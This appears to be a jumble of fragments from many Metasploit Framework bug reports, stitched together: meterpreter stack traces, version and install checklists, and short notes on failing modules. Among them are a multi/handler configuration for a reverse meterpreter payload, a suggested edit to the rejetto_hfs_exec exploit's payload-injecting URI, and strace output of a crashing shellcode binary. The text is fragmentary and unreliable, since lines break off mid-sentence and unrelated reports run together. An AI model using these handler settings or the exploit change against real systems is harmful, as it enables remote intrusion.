[09/06/2020 16:59:11] [e(0)] meterpreter: stdapi_fs_ls: operation failed: 1
[09/06/2020 16:59:15] [e(0)] meterpreter: stdapi_fs_ls: operation failed: 1
[09/06/2020 17:00:05] [e(0)] meterpreter: stdapi_fs_ls: operation failed: 1
``` </details> ## logs the following logs were recorded before the issue occurred:
<summary>collapse</summary> ```
[09/06/2020 16:59:15] [e(0)] meterpreter: stdapi_fs_ls: operation failed: 1
[09/06/2020 16:59:15] [d(0)] meterpreter: call stack:
/usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/fs/dir.rb:62:in `entries'
/usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/fs/dir.rb:270:in `download'
/usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console/command_dispatcher/stdapi/fs.rb:539:in `block in cmd_download'
/usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console/command_dispatcher/stdapi/fs.rb:491:in `each'
/usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console/command_dispatcher/stdapi/fs.rb:491:in `cmd_download'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:523:in `run_command'
/usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console.rb:105:in `run_command'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:474:in `block in run_single'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:468:in `each'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:468:in `run_single'
/usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console.rb:68:in `block in interact'
/usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:153:in `run'
/usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console.rb:66:in `interact'
/usr/share/metasploit-framework/lib/msf/base/sessions/meterpreter.rb:583:in `_interact'
/usr/share/metasploit-framework/lib/rex/ui/interactive.rb:51:in `interact'
/usr/share/metasploit-framework/lib/msf/ui/console/command_dispatcher/core.rb:1446:in `cmd_sessions'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:523:in `run_command'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:474:in `block in run_single'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:468:in `each'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:468:in `run_single'
/usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:158:in `run'
/usr/share/metasploit-framework/lib/metasploit/framework/command/console.rb:48:in `start'
/usr/share/metasploit-framework/lib/metasploit/framework/command/base.rb:82:in `start'
/usr/bin/msfconsole:23:in `<main>'
[09/06/2020 17:00:05] [e(0)] meterpreter: stdapi_fs_ls: operation failed: 1
[09/06/2020 17:00:05] [d(0)] meterpreter: call stack:
/usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/fs/dir.rb:82:in `entries_with_info'
/usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console/command_dispatcher/stdapi/fs.rb:629:in `list_path'
/usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console/command_dispatcher/stdapi/fs.rb:736:in `cmd_ls'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:523:in `run_command'
/usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console.rb:105:in `run_command'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:474:in `block in run_single'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:468:in `each'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:468:in `run_single'
/usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console.rb:68:in `block in interact'
/usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:153:in `run'
/usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console.rb:66:in `interact'
/usr/share/metasploit-framework/lib/msf/base/sessions/meterpreter.rb:583:in `_interact'
/usr/share/metasploit-framework/lib/rex/ui/interactive.rb:51:in `interact'
/usr/share/metasploit-framework/lib/msf/ui/console/command_dispatcher/core.rb:1446:in `cmd_sessions'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:523:in `run_command'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:474:in `block in run_single'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:468:in `each'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:468:in `run_single'
/usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:158:in `run'
/usr/share/metasploit-framework/lib/metasploit/framework/command/console.rb:48:in `start'
/usr/share/metasploit-framework/lib/metasploit/framework/command/base.rb:82:in `start'
/usr/bin/msfconsole:23:in `<main>'
``` </details> ## version/install the versions and install method of your metasploit setup:
<summary>collapse</summary> ```
framework: 5.0.101-dev
ruby: ruby 2.7.1p83 (2020-03-31 revision a0c7c23c9c) [x86_64-linux-gnu]
install root: /usr/share/metasploit-framework
session type: postgresql selected, no connection
install method: other - please specify
``` </details>
6.0.4-dev-0e6f6cdbbe ### i installed metasploit with:
- [ ] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [x] source install: ruby 2.5.5p157 ### os linux: debian 10
6.0.2 ### i installed metasploit with:
- [ ] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os what os are you running metasploit on? parrot 4.1.0
v.5.0.101-dev ### i installed metasploit with:
- [#] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os what os are you running metasploit on?
kali linux rpi 2020.3 ###notes from me
after the initialautorunscript shell_to_meterpreter failed
i try to run "sessions -u 1"
and i get meterpreter.
i think the problem is shell_to_meterpreter executed before msfconsole can detect the shell type
maybe we can fix it by adding a 5 second delay at initialautorunscript
v6.0.4 ### os windows 10 2004 (64 bit)
5.0.101-dev
### i installed metasploit with:
- [!] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os what os are you running metasploit on?
kali linux rpi 2020.3
metasploit v5.0.101-dev ### i installed metasploit with: source install (please specify ruby version)
ruby 2.7.1p83 (2020-03-31 revision a0c7c23c9c) [x86_64-linux-gnu] ### os what os are you running metasploit on?
kali linux.
![image](
![image](
framework: 6.0.4-dev-760aba0ace4cd3ce88c65af154fb70df57d09ea1
console : 6.0.4-dev-760aba0ace4cd3ce88c65af154fb70df57d09ea1 ### i installed metasploit with:
- [ ] kali package via apt
- [x] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os windows 10 #
metasploit v5.0.101-dev ### i installed metasploit with:
- [yes ] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os what os are you running metasploit on?
kali linux rpi 3b
linux getrektboy724 4.19.118-re4son-v8+ #1 smp preempt wed may 6 12:44:21 utc 2020 aarch64 gnu/linux
### i installed metasploit with:
- [ ] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os what os are you running metasploit on?
### i installed metasploit with:
- kali package via apt ### os target os: windows 10 what os are you running metasploit on? kali linux 2017.3
framework: 6.0.3-dev-
console : 6.0.3-dev- ### i installed metasploit with: kali package via apt ### os linux 5.7.0-kali1-amd64 x86_64 ### screenshots ![1]( ![2](
### i installed metasploit with:
- [ ] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os what os are you running metasploit on?
5.0.101-dev ### i installed metasploit with:
- [x] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os kali linux
framework: 6.0.2-dev-
console : 6.0.2-dev- ### i installed metasploit with:
- [ ] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ x] source install (please specify ruby version) ruby not installed, installed through apt using the msfinstall command from github
``` ///////////// skibum@pop-os ///////////////////// ------------- ///////*767//////////////// os: pop!_os 20.04 lts x86_64 //////7676767676*////////////// host: lemur pro lemp9 /////76767//7676767////////////// kernel: 5.4.0-7634-generic /////767676///*76767/////////////// uptime: 1 hour, 3 mins ///////767676///76767.///7676*/////// packages: 2054 (dpkg), 15 (flatpak) /////////767676//76767///767676//////// shell: fish 3.1.0 //////////76767676767////76767///////// resolution: 192 ///////////76767676//////7676////////// de: gnome ////////////,7676,///////767/////////// wm: mutter /////////////*7676///////76//////////// wm theme: pop ///////////////7676//////////////////// theme: pop-dark [gtk2/3] ///////////////7676///767//////////// icons: pop [gtk2/3] //////////////////////'//////////// terminal: gnome-terminal //////.7676767676767676767,////// cpu: intel i7-10510u (8) @ 4.900ghz /////767676767676767676767///// gpu: intel uhd graphics /////////////////////////// memory: 3621mib / 23925mib ///////////////////// ///////////// ```
### i installed metasploit with:
- [###] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os what os are you running metasploit on? kali linux, most recent version.
the os with the issue: ubuntu budgie
framework: 5.0.100-dev-53a97f811832f22104d4dc8770f099f73c9ba4dd
console : 5.0.100-dev-53a97f811832f22104d4dc8770f099f73c9ba4dd ### i installed metasploit with: commercial/community installer (from ### os what os are you running metasploit on?
windows 8.1
framework: 6.0.1-dev-
console : 6.0.1-dev- ### i installed metasploit with:
- [ ] kali package via apt
- [ ] omnibus installer (nightly)
- [x] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os ubuntu 19.10 # additional information
the verbose log explains the problem pretty clearly
line 128 forces use of smb version 1, and the server has it disabled.
replacing it with just `connect` fails because of the `stuff = self.simple.client.find_first("\\\\*")` line
i was able to temporarily bypass the issue by commenting out the findfirst line, and everything which dealt with "stuff"
the root folder of the share was writable, so it worked
it may be worth adding an option to set the folder path within the share, and only falling back to searching if that is unset
along with a note to that effect in the info section
due to my contract, i would require permission to share any code i have written during work hours with the community without explicit approval
which means i can't actually submit a pr unless i did the work on my own time on my own computer at home.
observed to happen with both 6.0.1-dev-1663bf3184 (this, former, instance installed by hand, with a rbenv-installed ruby 2.6.6) and 6.0.1-dev- (the latter installed via `msfupdate` installing ubuntu package version 6.0.1+20200808102425.git.2.6623d01~1rapid7-1) latest commitish for the source install: 1663bf31847b2cf92c736649c58c81adbce99272 (head -> master, origin/master, origin/head) automatic module_metadata_base.json update ### i installed metasploit with:
- [ ] kali package via apt
- [ ] omnibus installer (nightly)
- [x] commercial/community installer (from
- [x] source install (please specify ruby version) *ruby ### os what os are you running metasploit on? ubuntu 18.04.3 lts
framework: 5.0.99-dev
console : 5.0.99-dev ### i installed metasploit with:
[+] kali package via apt ### os kali linux x64 ## how to fix it line 110 in rejetto_hfs_exec.rb should be changed as follows: ` \'uri\' => "/?search=%00{.#{uri::encode_www_form_component(payload)}.}"`
5.0.101-dev ### i installed metasploit with:
- [x] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os
deverloper version ### i installed metasploit with:
ubuntu there are two ways to go about fixing it; the better is probably just checking to see if workspace is nil and then just printing the findings to the screen
we found this while landing but i think it would be better to fix all the modules at once, so if there is an issue down the road, it is easier to find the shared code.
framework: 6.0.1-dev-80889b2b86
console : 6.0.1-dev-80889b2b86
``` ### i installed metasploit with:
- [ ] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [x] source install (please specify ruby version) ```
ruby 2.7.0p0 (2019-12-25 revision 647ee6f091) [x86_64-linux]
``` got the same errors from an older ruby as well: ```
ruby 2.6.5p114 (2019-10-01 revision 67812) [x86_64-linux]
``` ### os what os are you running metasploit on? ubuntu 20.04
5.0.102-dev-29050882a7 ### i installed metasploit with: - [ ] source install (ruby 2.6.6p146 (2020-03-31 revision 67876) [x86_64-linux]) ### os what os are you running metasploit on? wslv1 running ubuntu 20.04 lts
metasploit-framework v5.0.101 ### i installed metasploit with:
- [ ] kali package via apt
- [ ] omnibus installer (nightly)
- [x] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os what os are you running metasploit on? windows 10 2004 build 19041.388
commandovm version 2020.2 ![2020-08-02 22_39_26-window](
5.0.102-dev-d951c37 (github current) ### i installed metasploit with:
- [ ] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version)
- [x] github dev env ### os ubuntu 16.04.6
framework: 5.0.102-dev-
console : 5.0.102-dev- ### i installed metasploit with:
- [x] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os what os are you running metasploit on?
kali linux 2020.2
framework: 5.0.102-dev-
console : 5.0.102-dev- ### i installed metasploit with:
- [ ] kali package via apt ### os
ubuntu 20.04.1
linux <hostname> 5.4.0-42-generic #46-ubuntu smp fri jul 10 00:24:02 utc 2020 x86_64 x86_64 x86_64 gnu/linux
framework: 5.0.100-dev-
console : 5.0.100-dev- ### i installed metasploit with:
- [ ] kali package via apt ### os
ubuntu 20.04
linux ubie 5.4.0-42-generic #46-ubuntu smp fri jul 10 00:24:02 utc 2020 x86_64 x86_64 x86_64 gnu/linux
framework: 5.0.100-dev-
console : 5.0.100-dev- ### i installed metasploit with:
- [ ] kali package via apt ### os
ubuntu 20.04
linux ubie 5.4.0-42-generic #46-ubuntu smp fri jul 10 00:24:02 utc 2020 x86_64 x86_64 x86_64 gnu/linux
4.17.1 ### i installed metasploit with:
- [ ] commercial/community installer (from
`5.0.101-dev-` ### i installed metasploit with:
- [ ] kali package via apt
- [x] omnibus installer (nightly) (installed today 7/24)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os wsl
5.0.100 ### i installed metasploit with:
- [ ] kali package via apt
- [ ] omnibus installer (nightly)
- [x] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os windows 10 1809 64-bit there seemed to be some issues with the msi install and windows defender, but everything else seems to work and the windef issue was addressed.
framework: 5.0.97-dev
console : 5.0.97-dev
``` ### i installed metasploit with:
kali was installed upon setting up this vm
### os linux - debian
metasploit v5.0.96-dev [kali]
metasploit v5.0.87-dev [parrot] ### i installed metasploit with:
- [x ] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os what os are you running metasploit on? linux kali 5.6.0-kali2-amd64 #1 smp debian 5.6.14-2kali1 (2020-06-10) x86_64 gnu/linux linux parrot 5.5.0 (2020-04-25)
msf5 > version
framework: 5.0.96-dev
console : 5.0.96-dev
``` ### i installed metasploit with:
- [x] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os what os are you running metasploit on?
cat /etc/*release
pretty_name="kali gnu/linux rolling"
name="kali gnu/linux"
version="2020.2"
version_id="2020.2"
version_codename="kali-rolling"
id_like=debian
ansi_color="1;31"
home_url=" "
support_url=" "
bug_report_url=" "
### i installed metasploit with:
- [ ] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [x] source install (please specify ruby version) ```
"version": "5.0.90-dev-e2e2ee557b",
"ruby": "2.6.6 x86_64-linux 2020-03-31",
"api": "1.0"
``` ### os what os are you running metasploit on? manjaro
framework: 5.0.96-dev-
console : 5.0.96-dev-
``` ### i installed metasploit with:
- [ x ] kali package via apt what os are you running metasploit on?
latest kali linux note:
i'm also having issues with record_mic, the only way it works, when it does, is if i set it as follows:
record_mic -d 25
and i only get 13 seconds of recording...should i open a separate issue for this? if any information is missing or needed please let me know
thanks in advanced.
framework: 5.0.89-dev
console: 5.0.89-dev ### i installed metasploit with:
- [+] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os kali linux amd64
dc576a51f860ca6526d69083d33bf643eb9a3dcd ### i installed metasploit with:
- [ ] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [x] source install (please specify ruby version)
ruby 2.6.6p146 (2020-03-31 revision 67876) [x86_64-linux] ### os
debian 10 so it looks like the linux ysoserial payloads are completely broken
i have tested the payloads in pr #13604 from ysoserial upstream and they work fine, but the metasploit ones do not work at all
tagging @wvu-r7 since he asked me to do so, and @cdelafuente-r7 as he's handling the exploit pr
sorry it took me so long to open this bug report!
`fa496b939550a5b04dbe19df9f47d16eebc08d40 (head -> master, upstream/master) automatic module_metadata_base.json update`g ### i installed metasploit with:
- [ ] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [x] source install (ruby 2.6.6 via rvm) ### os fedora 32 x64
### i installed metasploit with:
- [ ] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os what os are you running metasploit on?
v5.0.83 ### i installed metasploit with:
- [ ] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [x] source install (please specify ruby version) ruby version : 2.6.5
### os alpine3.10
framework: 5.0.88-dev-6f73604183
console : 5.0.88-dev-6f73604183
framework: 5.0.87-dev-1bec0a9c199735e9088ebfb0e6332fed5ab49db8
console : 5.0.87-dev-1bec0a9c199735e9088ebfb0e6332fed5ab49db8 ### i installed metasploit with: - [ ] omnibus installer (nightly) ### os windows 10 home
- framework: 5.0.84-dev
- console: 5.0.84-dev
### i installed metasploit with:
- [x ] kali package via apt
linux kali 5.4.0-kali4-amd64 #1 smp debian 5.4.19-1kali1 (2020-02-17) x86_64 gnu/linux
``` ### i installed metasploit with: - [ ] kali package via apt ### os kali linux.
### i installed metasploit with:
- [ ] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os what os are you running metasploit on?
centos7 x64
framework: 5.0.83-dev-
console : 5.0.83-dev- ### i installed metasploit with:
omnibus installer (nightly) ### os what os are you running metasploit on?
win10 x64 ### problem description
if the client is windows 10, using the screenshot command will log off the system and the session will not be lost
![image]( ### logs
[04/02/2020 22:06:03] [e(0)] meterpreter: error running command screenshot: rex::timeouterror operation timed out.
[04/02/2020 22:06:03] [d(0)] meterpreter: call stack:
/opt/metasploit-framework/embedded/framework/lib/rex/post/meterpreter/packet_dispatcher.rb:177:in `send_request'
/opt/metasploit-framework/embedded/framework/lib/rex/post/meterpreter/extensions/stdapi/ui.rb:191:in `screenshot'
/opt/metasploit-framework/embedded/framework/lib/rex/post/meterpreter/ui/console/command_dispatcher/stdapi/ui.rb:176:in `cmd_screenshot'
/opt/metasploit-framework/embedded/framework/lib/rex/ui/text/dispatcher_shell.rb:523:in `run_command'
/opt/metasploit-framework/embedded/framework/lib/rex/post/meterpreter/ui/console.rb:105:in `run_command'
/opt/metasploit-framework/embedded/framework/lib/rex/ui/text/dispatcher_shell.rb:474:in `block in run_single'
/opt/metasploit-framework/embedded/framework/lib/rex/ui/text/dispatcher_shell.rb:468:in `each'
/opt/metasploit-framework/embedded/framework/lib/rex/ui/text/dispatcher_shell.rb:468:in `run_single'
/opt/metasploit-framework/embedded/framework/lib/rex/post/meterpreter/ui/console.rb:68:in `block in interact'
/opt/metasploit-framework/embedded/framework/lib/rex/ui/text/shell.rb:153:in `run'
/opt/metasploit-framework/embedded/framework/lib/rex/post/meterpreter/ui/console.rb:66:in `interact'
/opt/metasploit-framework/embedded/framework/lib/msf/base/sessions/meterpreter.rb:583:in `_interact'
/opt/metasploit-framework/embedded/framework/lib/rex/ui/interactive.rb:51:in `interact'
/opt/metasploit-framework/embedded/framework/lib/msf/ui/console/command_dispatcher/core.rb:1384:in `cmd_sessions'
/opt/metasploit-framework/embedded/framework/lib/rex/ui/text/dispatcher_shell.rb:523:in `run_command'
/opt/metasploit-framework/embedded/framework/lib/rex/ui/text/dispatcher_shell.rb:474:in `block in run_single'
/opt/metasploit-framework/embedded/framework/lib/rex/ui/text/dispatcher_shell.rb:468:in `each'
/opt/metasploit-framework/embedded/framework/lib/rex/ui/text/dispatcher_shell.rb:468:in `run_single'
/opt/metasploit-framework/embedded/framework/lib/rex/ui/text/shell.rb:158:in `run'
/opt/metasploit-framework/embedded/framework/lib/metasploit/framework/command/console.rb:48:in `start'
/opt/metasploit-framework/embedded/framework/lib/metasploit/framework/command/base.rb:82:in `start'
/opt/metasploit-framework/bin/../embedded/framework/msfconsole:17:in `<main>' ```
framework: 5.0.82-dev-2ae08807e6
console : 5.0.82-dev-2ae08807e6 ### i installed metasploit with:
- [ ] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [x] source install (please specify ruby version)
ruby 2.5.5p157 (2019-03-15 revision 67260) [x86_64-linux-gnu] ### os debian 10 ## remarks this is unexpected and undesirable behaviour
if the payload does not have any bad chars, payload.encoded should be equal to payload.raw
i believe this makes it much easier for an ips to identify malicious payloads, and that was my original motivation for adding the command targets
this was shared with @wvu-r7 on irc, which asked me to open this bug.
framework: 5.0.83-dev-3fbcfa4100
console : 5.0.83-dev-3fbcfa4100 ruby: ruby 2.6.5p114 (2019-10-01 revision 67812) [x86_64-linux] ### i installed metasploit with:
- source install (please specify ruby version) ### os windows 10 insider fast with wsl2 running ubuntu on 4.19.84-microsoft-standard kernel.
framework: 5.0.82-dev-
console : 5.0.82-dev-
``` ### i installed metasploit with:
- [x] metasploit fedora rpm repository ### os fedora 31
### i installed metasploit with:
- [ ] kali package via apt
- [x] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os what os are you running metasploit on? windows 10 v1909
framework: 5.0.80-dev
console : 5.0.80-dev ### i installed metasploit with:
kali package via apt ### os
kali linux 2020.2 running
framework: 5.0.80-dev
console : 5.0.80-dev ### i installed metasploit with:
kali package via apt ### os
kali linux 2020.2 running
framework: 5.0.80-dev
console : 5.0.80-dev ### i installed metasploit with:
kali package via apt ### os
kali linux 2020.2 running
framework: 5.0.80-dev
console : 5.0.80-dev ### i installed metasploit with:
kali package via apt ### os
kali 2020.2 running
framework: 5.0.81-dev-11da08a303
console : 5.0.81-dev-11da08a303
``` ### i installed metasploit with:
- [x] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os what os are you running metasploit on? - mac
framework version: 5.0.79-dev ### i installed metasploit with:
- [ x] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os
linux 5.4.0-kali4-amd64 #1 smp debian 5.4.19-1kali1 (2020-02-17) x86_64 gnu/linux what os are you running metasploit on?
msf5 post(windows/manage/enable_rdp) > version
framework: 5.0.80-dev-47f4f2d981
console : 5.0.80-dev-47f4f2d981
### i installed metasploit with:
- [ ] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [x ] source install from github (please specify ruby version) ruby 2.6.0
### os what os are you running metasploit on?
msf5 > version
event fired: on_ui_command(version)
framework: 5.0.77-dev
console : 5.0.77-dev
``` ### i installed metasploit with: `docker pull metasploitframework/metasploit-framework` which pulled in a docker image based on [commit 8190ce7]( ### os what os are you running metasploit on? macos docker host, the docker container is running
framework: 5.0.73-dev
console : 5.0.73-dev ### i installed metasploit with:
- [x] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os
kali linux: kali rolling (2019.04), the one that comes with the os
framework: 5.0.72-dev
console : 5.0.72-dev
``` ### i installed metasploit with:
- [x] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os
distributor id: kali
description: kali gnu/linux rolling
release: 2020.1
codename: kali-rolling
5.0.73-dev ### i installed metasploit with:
- [ ] kali package via apt ### os
kali-rolling (updated 14.02.2020)
framework: 5.0.61-dev-
console : 5.0.61-dev- ### i installed metasploit with:
- [ ] kali package via apt
- [x] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os
distributor id: ubuntu
description: pop!_os 19.04
release: 19.04
codename: disco ## related issue on other repository
#issuecomment-561949169
framework: 5.0.60-dev
console : 5.0.60-dev ### metasploit handler
i used the following options for the metasploit handler: ```
exploit(multi/handler) > set payload <same_as_payload>, e.g.
exploit(multi/handler) > set payload linux/x86/meterpreter/reverse_nonx_tcp
exploit(multi/handler) > set lhost 0.0.0.0
exploit(multi/handler) > set lport 443
exploit(multi/handler) > run -j
``` ### strace output
$ sudo strace ./pub1
execve("./pub1", ["./pub1"], /* 15 vars */) = 0
brk(null) =
access("/etc/ld.so.nohwcap", f_ok) = -1 enoent (no such file or directory)
access("/etc/ld.so.preload", r_ok) = -1 enoent (no such file or directory)
openat(at_fdcwd, "/etc/ld.so.cache", o_rdonly|o_cloexec) = 3
fstat(3, {st_mode=s_ifreg|0644, st_size=22482, ...}) = 0
mmap(null, 22482, prot_read, map_private, 3, 0) =
close(3) = 0
access("/etc/ld.so.nohwcap", f_ok) = -1 enoent (no such file or directory)
openat(at_fdcwd, "/lib/x86_64-linux-gnu/libc.so.6", o_rdonly|o_cloexec) = 3
read(3, "\\177elf\\2\\1\\1\\3\\0\\0\\0\\0\\0\\0\\0\\0\\3\\0>\\0\\1\\0\\0\\0\\260\\34\\2\\0\\0\\0\\0\\0"..., 832) = 832
fstat(3, {st_mode=s_ifreg|0755, st_size=2030544, ...}) = 0
mmap(null, 8192, prot_read|prot_write, map_private|map_anonymous, -1, 0) =
mmap(null, 4131552, prot_read|prot_exec, map_private|map_denywrite, 3, 0) =
mprotect( , 2097152, prot_none) = 0
mmap( , 24576, prot_read|prot_write, map_private|map_fixed|map_denywrite, 3, ) =
mmap( , 15072, prot_read|prot_write, map_private|map_fixed|map_anonymous, -1, 0) =
close(3) = 0
arch_prctl(arch_set_fs, ) = 0
mprotect( , 16384, prot_read) = 0
mprotect( , 4096, prot_read) = 0
mprotect( , 4096, prot_read) = 0
munmap( , 22482) = 0
fstat(1, {st_mode=s_ifchr|0620, st_rdev=makedev(136, 2), ...}) = 0
brk(null) =
brk( ) =
write(1, "shellcode length: 96\ ", 21shellcode length: 96
--- sigsegv {si_signo=sigsegv, si_code=segv_maperr, si_addr= } ---
+++ killed by sigsegv (core dumped) +++
segmentation fault ``` ### i installed metasploit with:
- [x] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os
metasploit: kali linux ami linux ami-0efaa1daf599f3b8e
linux kali 5.3.0-kali2-amd64 #1 smp debian 5.3.9-3kali1 (2019-11-20) x86_64 gnu/linux
### issues & help i'm aware of
- - irrelevant; not a connection issue
- - same
- - afaik i'm doing the handler right
(setting `payload` to the one i used on victim machine)
- - solution implemented - - i never even got to this point
`19fa008b4321a06cac0ec0fb1cc85d64f4129430 (head -> master, origin/master, origin/head) land #12856, whitespace cleanup in cracker lib` ### i installed metasploit with:
- [ ] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [x ] source install (please specify ruby version) `ruby 2.5.7p206 (2019-10-01 revision 67816) [x86_64-linux-gnu]` ### os kali rolling.
framework: 5.0.68-dev
console : 5.0.68-dev
``` ### i installed metasploit with:
- [x] kali package via apt
framework: 5.0.68-dev
console : 5.0.68-dev
``` ### i installed metasploit with:
- [x] kali package via apt
`framework version: 5.0.64-dev` ### i installed metasploit with:
- [x] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version)
framework: 5.0.68-dev-
console : 5.0.68-dev- ### i installed metasploit with:
- [ x] kali package via apt ### os kali linux
5.0.68 ### i installed metasploit with:
- nightly installer ### os
macos catalina 10.15.2
framework: 5.0.63-dev
console : 5.0.63-dev ### i installed metasploit with:
- [ x] kali package via apt ### os kali rolling 2019.4
installed: normal debian bundle, with metasploit in opt
metasploit v5.0.63-dev ### i installed metasploit with:
- [x ] kali package via apt ### os kali
framework: 5.0.62-dev
console : 5.0.62-dev ### i installed metasploit with:
kali rolling package
`framework version: 5.0.62-dev` ### i installed metasploit with:
- [x] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version) ![image](
framework: 5.0.62-dev
console : 5.0.62-dev ### i installed metasploit with:
kali package ### os
framework: 5.0.63-dev-104710ca41
console : 5.0.63-dev-104710ca41 ### i installed metasploit with:
- [ ] source install (ruby version 2.6.5) ### os
macos 10.14.6
5.0.59-dev ### i installed metasploit with:
- [x] kali package via apt ### os
what os are you running metasploit on?
kali 2019.4
framework: 5.0.57-dev
console : 5.0.57-dev
``` ### i installed metasploit with:
- [x] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os kali linux
`b7acbfe8b6fe4060e1494003b31c627b94f2fb5e (head -> master, upstream/master) automatic module_metadata_base.json update` ### installed with: - [ ] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [x] source install (please specify ruby version) ### os what os are you running metasploit on? ```
productname: mac os x
productversion: 10.14.6
buildversion: 18g103
framework: 4.17.80-dev
console : 4.17.80-dev
pro : 4.16.0-2019091001 ### i installed metasploit with:
- [ ] kali package via apt
- [ ] omnibus installer (nightly)
- [x] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os what os are you running metasploit on? windows x64, but i also have it on ubuntu windows subsystem.
4d9780f0703fac19cde6aa4ac2527066f0f7b85b ### i installed metasploit with: installed from source.
using ruby 2.6.2p47 (2019-03-13 revision 67232) [x86_64-darwin16] ### os macos 10.12.6
